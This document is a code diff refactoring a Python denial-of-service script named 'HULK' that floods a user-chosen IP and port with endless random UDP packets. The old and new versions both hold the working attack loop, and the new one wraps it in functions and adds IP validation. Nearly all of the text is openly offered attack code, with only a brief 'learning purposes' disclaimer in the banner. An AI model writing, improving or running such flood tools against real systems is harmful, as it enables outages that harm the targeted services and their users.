@@ -1,31 +1,26 @@
-#Lets import modules
-import sys
-import os
-import time
-import socket
-import scapy.all as scapy
 import random
+import socket
 import threading
-from django.core.validators import URLValidator
-from django.core.exceptions import ValidationError
+import ipaddress  # Use ipaddress module for IP validation
 
-validate = URLValidator()
+# Define a function to send packets
+def send_packets(ip, port):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    bytes = random._urandom(1490)
+    sent = 0
+    try:
+        while True:
+            sock.sendto(bytes, (ip, port))
+            sent += 1
+            print(f"\n [+] Successfully sent {sent} packet to {ip} through port: {port}")
+            if port == 65534:
+                port = 1
+    except KeyboardInterrupt:
+        print("\n [-] Ctrl+C Detected.........Exiting")
+        print(" [-] DDOS ATTACK STOPPED")
 
-#Lets start coding
-from datetime import datetime
-now = datetime.now()
-hour = now.hour
-minute = now.minute
-day = now.day
-month = now.month
-year = now.year
-
-#Lets define sock and bytes
-sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes = random._urandom(1490)
-os.system("clear")
-#Banner :
-print('''
+def main():
+    print('''
     ************************************************
     *            _  _ _   _ _    _  __             *
     *           | || | | | | |  | |/ /             * 
@@ -44,50 +39,40 @@ print('''
     *  3. Use for learning purposes                * 
     *  4. Does HULK suit in villain role, huh?     *
     ************************************************
-	''')
-#Type your ip and port number (find IP address using nslookup or any online website) 
-ip = input(" [+] Give HULK A Target IP : ")
-port = eval(input(" [+] Starting Port NO : "))
-os.system("clear")
-print('''
-    ************************************************
-    *            _  _ _   _ _    _  __             *
-    *           | || | | | | |  | |/ /             * 
-    *           | __ | |_| | |__| ' <              *
-    *           |_||_|\___/|____|_|\_\             *
-    *                                              *
-    *          HTTP Unbearable Load King           *
-    *          Author: Sumalya Chatterjee          *
-    *                                              *
-    ************************************************
+    ''')
 
-	''')
-try:
-	validate = ip
-	print(" ✅ Valid IP Checked.... ")
-	print(" [+] Attack Screen Loading ....")
-except ValidationError as exception :
-	print(" ✘ Input a right url")
+    ip = input(" [+] Give HULK A Target IP : ")
 
-#Lets start our attack
-print(" ")
-print("    That's my secret Cap, I am always angry ")
-print(" " )
-print(" [+] HULK is attacking server " + ip )
-print (" " )
-time.sleep(5)
-sent = 0
-try :
- while True:
-		sock.sendto(bytes, (ip, port))
-		sent = sent + 1
-		print("\n [+] Successfully sent %s packet to %s throught port:%s"%(sent,ip,port))
-		if port == 65534:
-			port = 1
-except KeyboardInterrupt:
-	print(" ")
-	print("\n [-] Ctrl+C Detected.........Exiting")
-	print(" [-] DDOS ATTACK STOPPED")
-input(" Enter To Exit")
-os.system("clear")
-print(" [-] Dr. Banner is tired...")
+    try:
+        ipaddress.IPv4Address(ip)  # Validate IP address
+        print(" ✅ Valid IP Checked.... ")
+        print(" [+] Attack Screen Loading ....")
+        port = int(input(" [+] Starting Port NO : "))
+
+        print('''
+        ************************************************
+        *            _  _ _   _ _    _  __             *
+        *           | || | | | | |  | |/ /             * 
+        *           | __ | |_| | |__| ' <              *
+        *           |_||_|\___/|____|_|\_\             *
+        *                                              *
+        *          HTTP Unbearable Load King           *
+        *          Author: Sumalya Chatterjee          *
+        *                                              *
+        ************************************************
+        ''')
+
+        print(" ")
+        print("    That's my secret Cap, I am always angry ")
+        print(" " )
+        print(" [+] HULK is attacking server " + ip )
+        print (" " )
+        input("Press Enter to start the attack...")
+
+        send_packets(ip, port)
+
+    except ValueError:
+        print(" ✘ Input a valid IP address")
+
+if __name__ == "__main__":
+    main()
